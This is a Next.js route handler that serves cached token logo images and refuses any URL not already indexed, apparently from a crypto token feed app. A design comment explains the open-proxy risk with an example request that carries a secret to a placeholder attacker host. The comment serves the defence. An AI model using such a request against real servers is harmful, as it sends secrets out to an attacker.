import { NextResponse } from "next/server";
import { cached, noteImage, recentlyFailed, resolveImage } from "@/lib/feed/images";
import { isKnownLogo } from "@/lib/feed/query";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Serves token artwork from the shared cache, fetching it if the launch sweep
 * has not warmed it yet. Resolution, gateway fallback and the private-address
 * guard all live in lib/feed/images.
 */
export async function GET(req: Request) {
  const raw = new URL(req.url).searchParams.get("u") ?? "";
  if (!raw || raw.length > 512) return new NextResponse(null, { status: 400 });

  /*
   * Only artwork this app has actually indexed.
   *
   * Without this the route is an open forward proxy: it fetched whatever URL
   * it was handed. That is an exfiltration channel that a Content-Security-
   * Policy cannot close, because the request to reach it is same-origin and
   * therefore allowed — a script on the page could call
   * /api/img?u=https://attacker/?k=<secret> and this server would dutifully
   * make that request on its behalf, carrying the secret in the URL.
   *
   * The logo strings come from token contracts and are already stored, so the
   * set of URLs worth proxying is known and finite. Anything else is refused.
   */
  if (!isKnownLogo(raw)) return new NextResponse(null, { status: 403 });

  /*
   * How long this request will wait for a logo that is not cached yet.
   *
   * Fetches are queued six at a time, so a viewer arriving during a burst
   * could otherwise sit behind a long line holding one of the browser's six
   * connections — which is the problem the queue was meant to solve, moved.
   * Waiting briefly and then giving up costs nothing: the fetch is already
   * running and keeps going, so the image is there on the next render.
   */
  const PATIENCE_MS = 2_500;
  const wait = <T,>(p: Promise<T>): Promise<T | null> =>
    Promise.race([p, new Promise<null>((r) => setTimeout(() => r(null), PATIENCE_MS))]);

  // A logo that failed everywhere a moment ago is not worth another attempt.
  noteImage("asked");
  let hit = cached(raw);
  // Counted here as well as in resolveImage: the route checks the cache first,
  // so without this the hit counter read zero while most requests were hits.
  if (hit) noteImage("cacheHit");
  if (!hit) {
    if (recentlyFailed(raw)) {
      noteImage("blocked");
    } else {
      hit = await wait(resolveImage(raw));
      if (!hit) noteImage("gaveUpWaiting");
    }
  }
  /*
   * 404 rather than a placeholder: the client falls back to the direct URL and
   * then to its initials tile, which it can do only if this says nothing.
   *
   * Cached briefly. Uncached, it is re-requested on every render by every
   * viewer; cached for long, a logo that was merely slow this minute stays
   * missing for the rest of the session. Thirty seconds stops the stampede
   * without turning a busy gateway into a permanent hole in the feed.
   */
  if (!hit) {
    return new NextResponse(null, {
      status: 404,
      headers: { "cache-control": "public, max-age=30" },
    });
  }

  return new NextResponse(hit.body, {
    headers: { "content-type": hit.type, "cache-control": "public, max-age=1800" },
  });
}
